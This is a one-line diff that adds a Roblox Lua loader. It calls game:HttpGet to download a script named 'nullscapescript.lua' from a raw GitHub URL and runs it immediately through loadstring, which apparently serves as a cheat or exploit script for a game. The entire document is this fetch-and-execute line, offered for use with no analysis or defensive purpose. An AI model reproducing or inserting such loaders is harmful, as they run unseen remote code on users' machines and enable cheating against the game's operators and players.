@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/notrealnotreal/notrealnotrealSSSS/refs/heads/main/script%20thing/nullscapescript.lua"))()
